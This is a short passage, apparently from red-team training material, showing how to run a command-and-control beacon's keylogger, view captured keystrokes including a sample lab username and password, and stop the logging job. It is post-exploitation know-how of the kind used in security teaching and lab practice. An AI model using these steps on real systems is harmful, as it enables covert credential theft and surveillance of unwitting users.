A keylogger can capture the keystrokes of a user, which is especially useful for capturing usernames, passwords and other sensitive data.

```shell
beacon> keylogger
[+] received keystrokes from Secret Application - Google Chrome by bfarmer
```

All keystrokes can be seen at **View > Keystrokes**.

```shell
New Tab - Google Chrome
=======
http://srv-1

srv-1 - Google Chrome
=======
bfarmer[tab]Sup3rman
```

The keylogger runs as a job that can be stopped with the `jobkill` command.

```shell
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    0     keystroke logger

beacon> jobkill 1
```
